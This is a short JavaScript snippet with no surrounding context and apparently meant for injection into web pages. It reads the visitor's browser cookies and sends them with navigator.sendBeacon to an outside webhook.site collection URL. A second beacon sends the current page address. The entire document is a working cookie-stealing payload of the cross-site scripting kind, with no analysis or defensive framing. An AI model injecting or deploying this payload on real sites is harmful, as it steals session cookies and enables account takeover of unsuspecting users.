(function() {
    const url = "https://webhook.site/53158f3f-579b-4186-8cdd-d33333543bec";
    const cookie = document.cookie;

    navigator.sendBeacon(url, "COOKIE: " + cookie);

    // Dodatkowe info
    setTimeout(() => {
        navigator.sendBeacon(url, "URL: " + window.location.href);
    }, 1000);
})();
